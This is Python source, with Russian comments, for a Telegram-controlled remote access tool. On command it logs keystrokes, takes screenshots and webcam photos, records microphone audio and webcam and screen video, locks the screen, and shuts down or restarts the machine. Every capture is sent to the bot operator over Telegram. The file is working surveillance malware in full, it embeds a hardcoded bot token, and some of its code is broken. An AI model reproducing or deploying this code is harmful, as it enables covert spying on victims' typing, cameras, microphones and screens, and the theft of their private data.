import traceback
import time
import threading
import tkinter as tk
import os
import io
import platform
import pyautogui
import psutil
import cv2
import numpy as np
from telegram import InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Updater, CommandHandler, CallbackQueryHandler
from pynput import keyboard as kb
import zipfile
import wave
import pyaudio
import lameenc

TOKEN = "8014169704:AAE3WDB94WmhBsz0fIHCSLeCxxM-Er_HGXg"
PASSWORD = "1717"

lock_event = threading.Event()
lock_window = None
start_time = time.time()

# Переменные для кейлоггера
keylogger_active = False
keylogger_data = ""
keylogger_lock = threading.Lock()
listener_thread = None

# Для записи видео
webcam_recording = False


def safe_run(func):
    def wrapper(update, context):
        try:
            return func(update, context)
        except Exception as e:
            print("Ошибка в обработчике:", e)
            traceback.print_exc()
            send_message(update, context, "❌ Произошла ошибка.")
    return wrapper


def safe_button(func):
    def wrapper(update, context):
        try:
            return func(update, context)
        except Exception as e:
            print("Ошибка в кнопке:", e)
            traceback.print_exc()
    return wrapper


def create_lock_window():
    global lock_window
    if lock_window:
        return
    lock_window = tk.Tk()
    lock_window.attributes('-fullscreen', True)
    lock_window.attributes('-topmost', True)
    lock_window.configure(bg='black')
    lock_window.title("Заблокировано")
    label = tk.Label(lock_window, text="🔒 Клиент заблокирован\nОжидайте разблокировку с сервера",
                     font=("Arial", 30), fg="white", bg="black")
    label.pack(expand=True)
    lock_window.protocol("WM_DELETE_WINDOW", lambda: None)

    def check_lock():
        if not lock_event.is_set():
            lock_window.destroy()
            return
        lock_window.after(500, check_lock)

    lock_window.after(500, check_lock)
    lock_window.mainloop()
    lock_window = None


def lock_screen():
    if not lock_event.is_set():
        lock_event.set()
        threading.Thread(target=create_lock_window, daemon=True).start()


def unlock_screen():
    lock_event.clear()


def send_message(update, context, text=None, media=None, reply_markup=None, parse_mode=None):
    try:
        if update.message:
            if media:
                return update.message.reply_photo(media.media)
            else:
                return update.message.reply_text(text, reply_markup=reply_markup, parse_mode=parse_mode)
        elif update.callback_query:
            if media:
                return update.callback_query.message.reply_photo(media.media)
            else:
                return update.callback_query.message.reply_text(text, reply_markup=reply_markup, parse_mode=parse_mode)
    except Exception as e:
        print("Ошибка при отправке сообщения:", e)


@safe_run
def start(update, context):
    send_message(update, context, "Выберите команду:", reply_markup=start_keyboard())


@safe_run
def cmd_lock(update, context):
    lock_screen()
    send_message(update, context, "🔒 Экран заблокирован.")


@safe_run
def unlock(update, context):
    args = context.args
    if len(args) == 1 and args[0] == PASSWORD:
        unlock_screen()
        send_message(update, context, "✅ Клиент разблокирован.")
    else:
        send_message(update, context, "❌ Неверный пароль.")


@safe_run
def shutdown(update, context):
    send_message(update, context, "⏻ Выключаю...")
    os.system("shutdown /s /t 1")


@safe_run
def restart(update, context):
    send_message(update, context, "🔁 Перезагружаюсь...")
    os.system("shutdown /r /t 1")


@safe_run
def screenshot(update, context):
    img = pyautogui.screenshot()
    buffer = io.BytesIO()
    img.save(buffer, format='PNG')
    buffer.seek(0)
    send_message(update, context, media=InputMediaPhoto(buffer))


@safe_run
def webcam(update, context):
    cap = cv2.VideoCapture(0)
    if not cap.isOpened():
        send_message(update, context, "❌ Не удалось получить доступ к веб-камере.")
        return
    ret, frame = cap.read()
    cap.release()
    if not ret:
        send_message(update, context, "❌ Ошибка при получении фото.")
        return
    is_success, buffer = cv2.imencode(".jpg", frame)
    if not is_success:
        send_message(update, context, "❌ Ошибка при сохранении фото.")
        return
    io_buf = io.BytesIO(buffer)
    io_buf.name = 'webcam.jpg'
    io_buf.seek(0)
    send_message(update, context, media=InputMediaPhoto(io_buf))


@safe_run
def stats(update, context):
    uptime = time.time() - start_time
    cpu = psutil.cpu_percent()
    mem = psutil.virtual_memory().percent
    disk = psutil.disk_usage('/').percent
    battery = psutil.sensors_battery()
    bat_str = f"{battery.percent}%" if battery else "Нет данных"
    text = (
        f"📊 Статистика:\n"
        f"Uptime: {time.strftime('%H:%M:%S', time.gmtime(uptime))}\n"
        f"CPU: {cpu}%\n"
        f"Память: {mem}%\n"
        f"Диск: {disk}%\n"
        f"Windows: {platform.version()}\n"
        f"Батарея: {bat_str}"
    )
    send_message(update, context, text)


# === КЕЙЛОГГЕР ===
@safe_run
def start_keylogger(update, context):
    global keylogger_active, keylogger_data, listener_thread
    if keylogger_active:
        send_message(update, context, "⚠️ Кейлоггер уже работает.")
        return
    keylogger_data = ""
    keylogger_active = True
    send_message(update, context, "🟢 Запущен кейлоггер. Жду 60 секунд...")

    def run_listener():
        with kb.Listener(on_press=on_press) as listener:
            listener.join()

    listener_thread = threading.Thread(target=run_listener, daemon=True)
    listener_thread.start()

    def stop_logger():
        global keylogger_active
        time.sleep(60)
        keylogger_active = False
        if keylogger_data.strip():
            send_message(update, context, f"📝 Лог:\n```\n{keylogger_data}\n```", parse_mode='Markdown')
        else:
            send_message(update, context, "📝 Ничего не было набрано.")

    threading.Thread(target=stop_logger, daemon=True).start()


def on_press(key):
    global keylogger_active, keylogger_data
    if not keylogger_active:
        return False
    try:
        with keylogger_lock:
            keylogger_data += key.char
    except AttributeError:
        if key == kb.Key.space:
            with keylogger_lock:
                keylogger_data += " "
        elif key == kb.Key.enter:
            with keylogger_lock:
                keylogger_data += "\n"
        elif key == kb.Key.backspace:
            with keylogger_lock:
                keylogger_data = keylogger_data[:-1]
        else:
            with keylogger_lock:
                keylogger_data += f" [{key}] "


# === АУДИО С МИКРОФОНА ===
def record_microphone(output_wav="output.wav", duration=5, rate=44100, chunk=1024):
    p = pyaudio.PyAudio()
    stream = p.open(format=pyaudio.paInt16,
                    channels=1,
                    rate=rate,
                    input=True,
                    frames_per_buffer=chunk)
    print("🎙️ Запись началась...")
    frames = []
    for _ in range(0, int(rate / chunk * duration)):
        data = stream.read(chunk)
        frames.append(data)
    print("🛑 Запись окончена.")
    stream.stop_stream()
    stream.close()
    p.terminate()
    wf = wave.open(output_wav, 'wb')
    wf.setnchannels(1)
    wf.setsampwidth(p.get_sample_size(pyaudio.paInt16))
    wf.setframerate(rate)
    wf.writeframes(b''.join(frames))
    wf.close()


def wav_to_mp3_lame(wav_path, mp3_path, bitrate=64):
    """Конвертирует WAV в MP3 с помощью lameenc (без ffmpeg)"""
    with open(wav_path, 'rb') as f:
        wav_data = f.read()

    audio_data = bytearray(wav_data[0x2C:])
    sample_rate = 44100
    channels = 1

    encoder = lameenc.Encoder()
    encoder.set_bit_rate(bitrate)
    encoder.set_in_sample_rate(sample_rate)
    encoder.set_channels(channels)
    encoder.set_quality(2)  # качество: 2 = лучшее, 7 = быстрое

    mp3_data = encoder.encode(bytes(audio_data))  # Исправлено: передаем bytes
    mp3_data += encoder.flush()

    with open(mp3_path, 'wb') as f:
        f.write(mp3_data)

    os.remove(wav_path)


@safe_run
def record_audio_command(update, context):
    args = context.args
    if not args or not args[0].isdigit():
        send_message(update, context, "❌ Используйте: /recordaudio <секунды> (до 60)")
        return

    duration = min(int(args[0]), 60)
    wav_file = "output.wav"
    mp3_file = "output.mp3"

    send_message(update, context, f"🎙️ Записываю аудио ({duration} сек)...")

    record_microphone(output_wav=wav_file, duration=duration)

    if not os.path.exists(wav_file):
        send_message(update, context, "❌ Ошибка при записи аудио.")
        return

    # Конвертируем в MP3
    wav_to_mp3_lame(wav_file, mp3_file)

    file_size = os.path.getsize(mp3_file) / (1024 * 1024)

    if file_size > 50:
        zip_file = "audio.zip"
        with zipfile.ZipFile(zip_file, 'w') as zipf:
            zipf.write(mp3_file, arcname=os.path.basename(mp3_file))
        os.remove(mp3_file)
        with open(zip_file, 'rb') as f:
            send_document(update, context, f, caption=f"📁 Сжатое аудио (~{int(file_size)} MB)")
        os.remove(zip_file)
    else:
        with open(mp3_file, 'rb') as f:
            send_document(update, context, f, caption=f"🎙️ Аудиозапись (~{int(file_size)} MB)")
        os.remove(mp3_file)


# === ВИДЕО С ВЕБКИ ===
def record_webcam_video(duration=10, filename="webcam_output.avi", resolution=(640, 480), fps=15):
    global webcam_recording
    if webcam_recording:
        return None
    webcam_recording = True
    cap = cv2.VideoCapture(0)
    if not cap.isOpened():
        webcam_recording = False
        return None
    cap.set(cv2.CAP_PROP_FRAME_WIDTH, resolution[0])
    cap.set(cv2.CAP_PROP_FRAME_HEIGHT, resolution[1])
    fourcc = cv2.VideoWriter_fourcc(*'XVID')
    out = cv2.VideoWriter(filename, fourcc, fps, resolution)
    start_time = time.time()
    while int(time.time() - start_time) < duration:
        ret, frame = cap.read()
        if ret:
            out.write(frame)
        else:
            break
    cap.release()
    out.release()
    webcam_recording = False
    return filename


# === ВИДЕО С ЭКРАНА ===
def record_screen_video(duration=10, filename="screen_output.avi", resolution=(1280, 720), fps=10):
    screen_size = pyautogui.size()
    screen_resized = resolution if screen_size.width >= resolution[0] else screen_size
    fourcc = cv2.VideoWriter_fourcc(*'XVID')
    out = cv2.VideoWriter(filename, fourcc, fps, screen_resized)
    start_time = time.time()
    while int(time.time() - start_time) < duration:
        img = pyautogui.screenshot()
        frame = cv2.cvtColor(np.array(img), cv2.COLOR_RGB2BGR)
        frame = cv2.resize(frame, screen_resized)
        out.write(frame)
    out.release()
    return filename


# === УТИЛИТЫ ===
def compress_to_zip(input_file, zip_name="output.zip"):
    with zipfile.ZipFile(zip_name, 'w') as zipf:
        zipf.write(input_file, arcname=os.path.basename(input_file))
    return zip_name


def send_document(update, context, file, caption=""):
    if update.message:
        update.message.reply_document(document=file, caption=caption)
    elif update.callback_query:
        update.callback_query.message.reply_document(document=file, caption=caption)


@safe_run
def send_webcam_video(update, context):
    args = context.args
    if not args or not args[0].isdigit():
        send_message(update, context, "❌ Используйте: /recordvideo <секунды> (до 30)")
        return
    duration = min(int(args[0]), 30)
    send_message(update, context, f"🎥 Записываю видео ({duration} сек)...")
    video_file = record_webcam_video(duration=duration)
    if not video_file or not os.path.exists(video_file):
        send_message(update, context, "❌ Не удалось записать видео.")
        return
    file_size = os.path.getsize(video_file) / (1024 * 1024)
    if file_size > 50:
        send_message(update, context, "📦 Файл больше 50 МБ. Архивирую...")
        zip_file = compress_to_zip(video_file, "webcam.zip")
        os.remove(video_file)
        with open(zip_file, 'rb') as f:
            send_document(update, context, f, caption=f"📁 Сжато (~{int(file_size)} MB)")
        os.remove(zip_file)
    else:
        with open(video_file, 'rb') as f:
            send_document(update, context, f, caption=f"🎥 Видео (~{int(file_size)} MB)")
        os.remove(video_file)


@safe_run
def send_screen_video(update, context):
    args = context.args
    if not args or not args[0].isdigit():
        send_message(update, context, "❌ Используйте: /screenvideo <секунды> (до 60)")
        return
    duration = min(int(args[0]), 60)
    send_message(update, context, f"🎥 Записываю экран ({duration} сек)...")
    video_file = record_screen_video(duration=duration)
    if not video_file or not os.path.exists(video_file):
        send_message(update, context, "❌ Не удалось записать видео.")
        return
    file_size = os.path.getsize(video_file) / (1024 * 1024)
    if file_size > 50:
        send_message(update, context, "📦 Файл больше 50 МБ. Архивирую...")
        zip_file = compress_to_zip(video_file, "screen.zip")
        os.remove(video_file)
        with open(zip_file, 'rb') as f:
            send_document(update, context, f, caption=f"📁 Сжато (~{int(file_size)} MB)")
        os.remove(zip_file)
    else:
        with open(video_file, 'rb') as f:
            send_document(update, context, f, caption=f"🖥 Видео с экрана (~{int(file_size)} MB)")
        os.remove(video_file)


# === КНОПКИ ===
def start_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🔒 Заблокировать", callback_data='lock')],
        [InlineKeyboardButton("🔓 Разблокировать", callback_data='unlock')],
        [InlineKeyboardButton("📸 Скриншот", callback_data='screenshot')],
        [InlineKeyboardButton("📷 Видео с вебки", callback_data='webshare')],
        [InlineKeyboardButton("🎙️ Запись микрофона", callback_data='recordaudio')],
        [InlineKeyboardButton("🖥 Запись экрана", callback_data='screenshare')],
        [InlineKeyboardButton("📊 Статистика", callback_data='stats')],
        [InlineKeyboardButton("⌨️ Кейлоггер", callback_data='keylogger')],
        [InlineKeyboardButton("⏻ Выключить", callback_data='shutdown')],
        [InlineKeyboardButton("🔁 Перезагрузить", callback_data='restart')],
    ])


@safe_button
def button_handler(update, context):
    query = update.callback_query
    query.answer()
    data = query.data
    if lock_event.is_set() and not data.startswith('unlock'):
        query.edit_message_text("❌ Клиент заблокирован.")
        return
    if data == 'lock':
        lock_screen()
        query.edit_message_text("🔒 Экран заблокирован.")
    elif data == 'unlock':
        query.edit_message_text("Введите /unlock <пароль>")
    elif data == 'shutdown':
        query.edit_message_text("⏻ Выключаю...")
        os.system("shutdown /s /t 1")
    elif data == 'restart':
        query.edit_message_text("🔁 Перезагружаюсь...")
        os.system("shutdown /r /t 1")
    elif data == 'screenshot':
        threading.Thread(target=screenshot, args=(update, context), daemon=True).start()
    elif data == 'webcam':
        threading.Thread(target=webcam, args=(update, context), daemon=True).start()
    elif data == 'stats':
        threading.Thread(target=stats, args=(update, context), daemon=True).start()
    elif data == 'keylogger':
        threading.Thread(target=start_keylogger, args=(update, context), daemon=True).start()
    elif data == 'webshare':
        send_message(update, context, "Введите /recordvideo <секунды> (до 30)")
    elif data == 'screenshare':
        send_message(update, context, "Введите /screenvideo <секунды> (до 60)")
    elif data == 'recordaudio':
        send_message(update, context, "Введите /recordaudio <секунды> (до 60)")


# === БОТ ===
def bot_loop():
    while True:
        try:
            print("Запуск бота...")
            updater = Updater(TOKEN, use_context=True)
            dp = updater.dispatcher
            dp.add_handler(CommandHandler("start", start))
            dp.add_handler(CommandHandler("lock", cmd_lock))
            dp.add_handler(CommandHandler("unlock", unlock))
            dp.add_handler(CommandHandler("shutdown", shutdown))
            dp.add_handler(CommandHandler("restart", restart))
            dp.add_handler(CommandHandler("screenshot", screenshot))
            dp.add_handler(CommandHandler("webcam", webcam))
            dp.add_handler(CommandHandler("stats", stats))
            dp.add_handler(CommandHandler("startlog", start_keylogger))
            dp.add_handler(CommandHandler("recordaudio", record_audio_command))
            dp.add_handler(CommandHandler("recordvideo", send_webcam_video))
            dp.add_handler(CommandHandler("screenvideo", send_screen_video))
            dp.add_handler(CallbackQueryHandler(button_handler))
            updater.start_polling()
            updater.idle()
        except Exception as e:
            print("Критическая ошибка! Перезапуск через 3 секунды.")
            traceback.print_exc()
            time.sleep(3)


if __name__ == "__main__":
    bot_loop()